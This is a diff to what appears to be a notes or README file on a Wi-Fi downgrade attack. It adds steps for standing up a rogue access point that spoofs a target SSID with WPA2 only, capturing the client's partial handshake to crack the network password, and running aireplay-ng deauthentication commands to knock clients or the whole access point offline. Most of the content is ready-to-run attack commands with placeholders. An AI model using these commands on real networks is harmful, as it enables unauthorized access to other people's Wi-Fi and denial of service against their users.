@@ -61,7 +61,17 @@ step 1: capture traffic
 sudo airodump-ng -c <CHANNEL> --bssid <ROGUE_AP_MAC> -w <FILENAME> <interface>
 
 step 2: start your rogue AP
-sudo create_ap -w 2 -c <CHANNEL> --mac <ROGUE_AP_MAC> --freq-band <2.4/5> <interface> <interface> <SSID> <PASSWORD>
+sudo create_ap -w 2 -c <CHANNEL> --mac <ROGUE_AP_MAC> --freq-band <2.4/5> <interface> <interface> <SSID> <PASSWORD> --no-virt
+
+After the SAE authentication exchange, WPA2's 4-way handshake is attempted (only 2 of four exchanged)
+Use these tp break the network password
+
+To recover the key, we must force the client to downgrade to WPA2, and capture that key exchange
+First, we establish a rogue AP, using the target SSID, but only supporting WPA2 and capture the EAPOL connection of the client with our rogue AP
+Next we DOS the target AP, or deauth a client
+
+sudo aireplay-ng -0 1 -a <AP_MAC> -c <CLIENT_MAC> <interface>
+sudo aireplay-ng -0 0 -a <AP_MAC> <interface>
 
 
 
